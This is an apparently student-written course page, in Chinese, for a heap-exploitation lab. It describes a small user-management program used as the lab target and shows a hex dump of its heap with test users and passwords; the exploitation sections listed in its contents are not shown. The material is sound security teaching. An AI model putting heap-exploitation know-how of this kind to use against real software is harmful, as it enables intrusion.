    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Lab4/Report.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab4
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Final/Report.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Final
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    大二下
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            大二下
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    计算机体系结构
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1">
            <span class="md-nav__icon md-icon"></span>
            计算机体系结构
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/Grading%20Policy.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Grading Policy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/Cache.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cache
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    面向对象程序设计
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_2">
            <span class="md-nav__icon md-icon"></span>
            面向对象程序设计
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Grading%20Policy.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Grading Policy
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    数据库系统
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_3">
            <span class="md-nav__icon md-icon"></span>
            数据库系统
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Grading%20Policy.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Grading Policy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Relational%20model.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Relational Model
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/SQL.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SQL
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Advanced%20SQL.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Advanced SQL
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/E-R%20model.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    E-R model
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Relational%20Database%20Design.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Relational Database Design
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Storage%20and%20File%20Structure.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Storage and File Structure
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Indexing%20and%20Hashing.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Indexing and Hashing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Query%20Processing.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Query Processing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Query%20Optimization.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Query Optimization
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Transactions.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Transactions
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Concurrency%20Control.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Concurrency Control
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%BA%8C%E4%B8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86/Recovery%20System.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Recovery System
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    大三上
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            大三上
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3_1" >
        
          
          <label class="md-nav__link" for="__nav_2_3_1" id="__nav_2_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    计算理论
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3_1">
            <span class="md-nav__icon md-icon"></span>
            计算理论
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/Sets_Relations_Language.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sets, Relations, and Language
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/Regular_Language_and_Automata.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Regular Language and Automata
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3_2" >
        
          
          <label class="md-nav__link" for="__nav_2_3_2" id="__nav_2_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    计算机网络
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3_2">
            <span class="md-nav__icon md-icon"></span>
            计算机网络
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Physical_Layer.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Physical Layer
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Data_Link_Layer.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Data Link Layer
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/The_Medium_Access_Control_Sublayer.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MAC Sublayer
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    C++
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            C++
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    C++基础
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            C++基础
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../C%2B%2B/C%2B%2B%E5%9F%BA%E7%A1%80/data_type.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    数据类型
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../C%2B%2B/C%2B%2B%E5%9F%BA%E7%A1%80/Variable.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    变量
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
        
          
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    库函数
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            库函数
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../C%2B%2B/%E5%BA%93%E5%87%BD%E6%95%B0/iostream.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    iostream
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../C%2B%2B/%E5%BA%93%E5%87%BD%E6%95%B0/string.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    string
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_3" >
        
          
          <label class="md-nav__link" for="__nav_3_2_3" id="__nav_3_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    STL
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_3">
            <span class="md-nav__icon md-icon"></span>
            STL
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../C%2B%2B/%E5%BA%93%E5%87%BD%E6%95%B0/STL/%E8%BF%AD%E4%BB%A3%E5%99%A8.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    迭代器
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../C%2B%2B/%E5%BA%93%E5%87%BD%E6%95%B0/STL/vector.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    vector
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      堆管理器基础
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      堆上常见漏洞
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      堆上漏洞的利用
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="_1">堆上漏洞及其利用<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
<h2 id="_2">堆管理器基础<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<h3 id="1">实践1：目标程序逻辑与编译<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
<p>​   这个程序是一个简单的用户信息管理系统，允许用户在内存中动态创建、编辑、查看和删除用户信息，并包含一个堆内存调试功能。在主程序中提供了交互菜单，提供了以下功能：</p>
<p>(1)<strong>添加用户</strong></p>
<ul>
<li>
<p><strong>逻辑</strong>：</p>
</li>
<li>
<p>查找 <code>infos</code> 中的空位（最多 16 个用户）。</p>
</li>
<li>为用户结构和简介字符串动态分配内存。</li>
<li>从输入读取用户的 <code>name</code>、<code>password</code>、<code>intro</code> 和 <code>motto</code>。</li>
<li>将新用户信息保存到数组中</li>
<li><strong>边界处理</strong>：</li>
<li>如果没有空位或内存不足，打印错误信息并返回。</li>
</ul>
<p><strong>(2) 删除用户</strong></p>
<ul>
<li><strong>逻辑</strong></li>
<li>根据索引查找用户信息，验证用户密码。</li>
<li>如果密码正确，释放动态分配的用户结构和简介字符串。</li>
<li>将对应的数组位置置为 <code>NULL</code>。</li>
<li><strong>边界处理</strong></li>
<li>检查用户是否存在以及密码是否正确。</li>
</ul>
<p><strong>(3) 查看用户</strong></p>
<ul>
<li><strong>逻辑</strong></li>
<li>根据索引查找用户信息，验证用户密码。</li>
<li>如果密码正确，打印用户的详细信息（包括 <code>name</code>、<code>motto</code> 和 <code>intro</code>）。</li>
<li><strong>边界处理</strong></li>
<li>同删除用户的检查逻辑。</li>
</ul>
<p><strong>(4) 编辑用户</strong></p>
<ul>
<li><strong>逻辑</strong></li>
<li>根据索引查找用户信息，验证用户密码。</li>
<li>如果密码正确，更新用户的 <code>name</code>、<code>intro</code> 和 <code>motto</code>。</li>
<li><strong>边界处理</strong></li>
<li>同删除用户的检查逻辑。</li>
</ul>
<p><strong>(5) <code>heap_debug()</code></strong></p>
<ol>
<li>读取 <code>/proc/self/maps</code>，获取当前程序堆的起始地址。</li>
<li>
<p>将堆的内容转储到一个文件中（文件名根据堆地址和计数器生成）。</p>
</li>
<li>
<p><strong>用途</strong>：便于开发者调试堆的使用情况，例如检测内存泄漏或数据损坏。</p>
</li>
</ol>
<p>以下为执行<code>ldd</code>后的运行截图</p>
<p><img alt="1" src="pic/1.jpg" /> </p>
<h3 id="2">实践2：堆内存分析<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
<h4 id="dumpbin">dump*.bin完整内容<a class="headerlink" href="#dumpbin" title="Permanent link">&para;</a></h4>
<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><a href="#__codelineno-0-1"><span class="linenos" data-linenos="  1 "></span></a>00000000  00 00 00 00 00 00 00 00  91 02 00 00 00 00 00 00  |................|
<a id="__codelineno-0-2" name="__codelineno-0-2"></a><a href="#__codelineno-0-2"><span class="linenos" data-linenos="  2 "></span></a>00000010  00 00 00 00 00 00 07 00  00 00 07 00 00 00 00 00  |................|
<a id="__codelineno-0-3" name="__codelineno-0-3"></a><a href="#__codelineno-0-3"><span class="linenos" data-linenos="  3 "></span></a>00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-4" name="__codelineno-0-4"></a><a href="#__codelineno-0-4"><span class="linenos" data-linenos="  4 "></span></a>*
<a id="__codelineno-0-5" name="__codelineno-0-5"></a><a href="#__codelineno-0-5"><span class="linenos" data-linenos="  5 "></span></a>000000a0  00 00 00 00 00 00 00 00  10 63 3b 02 00 00 00 00  |.........c;.....|
<a id="__codelineno-0-6" name="__codelineno-0-6"></a><a href="#__codelineno-0-6"><span class="linenos" data-linenos="  6 "></span></a>000000b0  00 00 00 00 00 00 00 00  a0 62 3b 02 00 00 00 00  |.........b;.....|
<a id="__codelineno-0-7" name="__codelineno-0-7"></a><a href="#__codelineno-0-7"><span class="linenos" data-linenos="  7 "></span></a>000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-8" name="__codelineno-0-8"></a><a href="#__codelineno-0-8"><span class="linenos" data-linenos="  8 "></span></a>*
<a id="__codelineno-0-9" name="__codelineno-0-9"></a><a href="#__codelineno-0-9"><span class="linenos" data-linenos="  9 "></span></a>00000290  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-10" name="__codelineno-0-10"></a><a href="#__codelineno-0-10"><span class="linenos" data-linenos=" 10 "></span></a>000002a0  60 63 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |`c;......`;.....|
<a id="__codelineno-0-11" name="__codelineno-0-11"></a><a href="#__codelineno-0-11"><span class="linenos" data-linenos=" 11 "></span></a>000002b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-12" name="__codelineno-0-12"></a><a href="#__codelineno-0-12"><span class="linenos" data-linenos=" 12 "></span></a>000002c0  31 32 33 34 35 36 00 00  00 00 00 00 00 00 00 00  |123456..........|
<a id="__codelineno-0-13" name="__codelineno-0-13"></a><a href="#__codelineno-0-13"><span class="linenos" data-linenos=" 13 "></span></a>000002d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-14" name="__codelineno-0-14"></a><a href="#__codelineno-0-14"><span class="linenos" data-linenos=" 14 "></span></a>000002e0  10 63 3b 02 00 00 00 00  74 72 79 20 65 76 65 72  |.c;.....try ever|
<a id="__codelineno-0-15" name="__codelineno-0-15"></a><a href="#__codelineno-0-15"><span class="linenos" data-linenos=" 15 "></span></a>000002f0  79 74 68 69 6e 67 00 00  00 00 00 00 00 00 00 00  |ything..........|
<a id="__codelineno-0-16" name="__codelineno-0-16"></a><a href="#__codelineno-0-16"><span class="linenos" data-linenos=" 16 "></span></a>00000300  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-17" name="__codelineno-0-17"></a><a href="#__codelineno-0-17"><span class="linenos" data-linenos=" 17 "></span></a>00000310  d0 63 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |.c;......`;.....|
<a id="__codelineno-0-18" name="__codelineno-0-18"></a><a href="#__codelineno-0-18"><span class="linenos" data-linenos=" 18 "></span></a>00000320  6d 20 62 6f 62 00 00 00  00 00 00 00 00 00 00 00  |m bob...........|
<a id="__codelineno-0-19" name="__codelineno-0-19"></a><a href="#__codelineno-0-19"><span class="linenos" data-linenos=" 19 "></span></a>00000330  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-20" name="__codelineno-0-20"></a><a href="#__codelineno-0-20"><span class="linenos" data-linenos=" 20 "></span></a>*
<a id="__codelineno-0-21" name="__codelineno-0-21"></a><a href="#__codelineno-0-21"><span class="linenos" data-linenos=" 21 "></span></a>00000350  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-22" name="__codelineno-0-22"></a><a href="#__codelineno-0-22"><span class="linenos" data-linenos=" 22 "></span></a>00000360  20 64 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  | d;......`;.....|
<a id="__codelineno-0-23" name="__codelineno-0-23"></a><a href="#__codelineno-0-23"><span class="linenos" data-linenos=" 23 "></span></a>00000370  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-24" name="__codelineno-0-24"></a><a href="#__codelineno-0-24"><span class="linenos" data-linenos=" 24 "></span></a>00000380  36 35 34 33 32 31 00 00  00 00 00 00 00 00 00 00  |654321..........|
<a id="__codelineno-0-25" name="__codelineno-0-25"></a><a href="#__codelineno-0-25"><span class="linenos" data-linenos=" 25 "></span></a>00000390  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-26" name="__codelineno-0-26"></a><a href="#__codelineno-0-26"><span class="linenos" data-linenos=" 26 "></span></a>000003a0  d0 63 3b 02 00 00 00 00  65 61 74 20 6d 6f 72 65  |.c;.....eat more|
<a id="__codelineno-0-27" name="__codelineno-0-27"></a><a href="#__codelineno-0-27"><span class="linenos" data-linenos=" 27 "></span></a>000003b0  20 76 65 67 65 74 61 62  6c 65 73 00 00 00 00 00  | vegetables.....|
<a id="__codelineno-0-28" name="__codelineno-0-28"></a><a href="#__codelineno-0-28"><span class="linenos" data-linenos=" 28 "></span></a>000003c0  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-29" name="__codelineno-0-29"></a><a href="#__codelineno-0-29"><span class="linenos" data-linenos=" 29 "></span></a>000003d0  90 64 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |.d;......`;.....|
<a id="__codelineno-0-30" name="__codelineno-0-30"></a><a href="#__codelineno-0-30"><span class="linenos" data-linenos=" 30 "></span></a>000003e0  6d 20 61 6c 69 63 65 00  00 00 00 00 00 00 00 00  |m alice.........|
<a id="__codelineno-0-31" name="__codelineno-0-31"></a><a href="#__codelineno-0-31"><span class="linenos" data-linenos=" 31 "></span></a>000003f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-32" name="__codelineno-0-32"></a><a href="#__codelineno-0-32"><span class="linenos" data-linenos=" 32 "></span></a>*
<a id="__codelineno-0-33" name="__codelineno-0-33"></a><a href="#__codelineno-0-33"><span class="linenos" data-linenos=" 33 "></span></a>00000410  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-34" name="__codelineno-0-34"></a><a href="#__codelineno-0-34"><span class="linenos" data-linenos=" 34 "></span></a>00000420  e0 64 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |.d;......`;.....|
<a id="__codelineno-0-35" name="__codelineno-0-35"></a><a href="#__codelineno-0-35"><span class="linenos" data-linenos=" 35 "></span></a>00000430  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-36" name="__codelineno-0-36"></a><a href="#__codelineno-0-36"><span class="linenos" data-linenos=" 36 "></span></a>00000440  61 62 63 33 32 31 00 00  00 00 00 00 00 00 00 00  |abc321..........|
<a id="__codelineno-0-37" name="__codelineno-0-37"></a><a href="#__codelineno-0-37"><span class="linenos" data-linenos=" 37 "></span></a>00000450  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
